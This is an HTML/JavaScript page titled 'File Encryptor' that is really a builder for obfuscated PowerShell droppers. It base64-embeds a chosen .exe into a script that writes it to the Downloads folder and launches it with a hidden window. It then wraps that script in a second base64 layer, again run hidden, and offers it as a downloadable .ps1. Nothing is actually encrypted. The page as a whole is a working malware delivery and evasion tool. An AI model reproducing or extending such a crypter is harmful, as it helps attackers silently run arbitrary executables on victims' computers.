<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Encryptor</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(to right, #1c1c1c, #3a3a3a);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        h1 {
            margin-bottom: 30px;
            font-size: 3.5rem;
            text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.9);
        }
        .container {
            display: flex;
            flex-direction: row;
            justify-content: space-around;
            width: 100%;
            max-width: 900px;
            padding: 20px;
            border-radius: 15px;
            background-color: rgba(50, 50, 50, 0.8);
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.7);
        }
        .box {
            background-color: rgba(255, 0, 0, 0.1);
            border-radius: 10px;
            padding: 20px;
            margin: 10px;
            width: 45%;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
            transition: transform 0.3s;
        }
        .box:hover {
            transform: scale(1.05);
        }
        button {
            padding: 15px 25px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px 0;
            background-color: #ff4757;
            color: white;
            transition: background-color 0.3s, transform 0.2s;
            width: 100%;
        }
        button:hover {
            background-color: #ff6b81;
            transform: scale(1.05);
        }
        input[type="file"] {
            display: none;
        }
        label {
            background-color: #d63031;
            padding: 15px;
            border-radius: 5px;
            color: white;
            cursor: pointer;
            display: inline-block;
            margin: 10px 0;
            transition: background-color 0.3s;
        }
        label:hover {
            background-color: #e84118;
        }
        #ps-output {
            border: 1px solid white;
            padding: 10px;
            display: inline-block;
            width: 100%;
            word-wrap: break-word;
            color: #ffeb3b;
            margin-top: 10px;
            background-color: rgba(255, 0, 0, 0.2);
            border-radius: 5px;
        }
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
                align-items: center;
            }
            .box {
                width: 90%;
            }
        }
    </style>
</head>
<body>

    <h1>File Encryptor</h1>
    <div class="container">
        <div class="box" id="file-selection-box">
            <h2>Choose the File</h2>
            <label id="choose-file-button" for="file-input">Choose File</label>
            <input type="file" id="file-input" accept=".exe" />
            <div id="file-name">No file chosen</div>
        </div>

        <div class="box" id="ps1-generation-box">
            <h2>PS1 Generation</h2>
            <button id="generate-ps-button" onclick="generatePSScript()">Generate PS1 Code</button>
            <div id="ps-output">PowerShell Code: Click to Generate</div>
            <button id="copy-ps-button" onclick="copyPSScript()">Copy PS1 Script</button>
            <button id="crypt-button" onclick="createCrypter()">PowerShell Crypter</button>
        </div>
    </div>

    <script>
        let selectedFile;
        let finalPSCode = '';

        document.getElementById("file-input").addEventListener("change", function() {
            const fileNameDisplay = document.getElementById("file-name");
            if (this.files.length > 0) {
                selectedFile = this.files[0];
                fileNameDisplay.textContent = selectedFile.name;
            } else {
                fileNameDisplay.textContent = "No file chosen";
            }
        });

        function generatePSScript() {
            if (!selectedFile) {
                alert("Please choose a file first.");
                return;
            }

            const reader = new FileReader();
            reader.onload = function(event) {
                const base64String = event.target.result.split(',')[1];
                finalPSCode = `
                $b="${base64String}";[IO.File]::WriteAllBytes("$HOME\\Downloads\\executable.exe",[Convert]::FromBase64String($b));
                Start-Process -FilePath "$HOME\\Downloads\\executable.exe" -WindowStyle Hidden;`;
                document.getElementById("ps-output").textContent = "PowerShell Code: " + finalPSCode.trim().substring(0, 50) + '...';
            };

            reader.readAsDataURL(selectedFile);
        }

        function copyPSScript() {
            navigator.clipboard.writeText(finalPSCode).then(() => {
                alert("PowerShell script copied to clipboard!");
            }).catch(err => {
                console.error('Error copying to clipboard: ', err);
            });
        }

        function createCrypter() {
            if (!finalPSCode) {
                alert("Please generate PowerShell code first.");
                return;
            }

            const encodedCode = btoa(finalPSCode);
            const psFileContent = `
            $code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${encodedCode}'));
            Set-Content -Path "$HOME\\Downloads\\script.ps1" -Value $code;
            Start-Process -FilePath "$HOME\\Downloads\\script.ps1" -WindowStyle Hidden;`.trim();

            const blob = new Blob([psFileContent], { type: 'application/octet-stream' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'encrypted_script.ps1';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            alert("Encrypted PowerShell script downloaded to Downloads folder!");
        }
    </script>

</body>
</html>
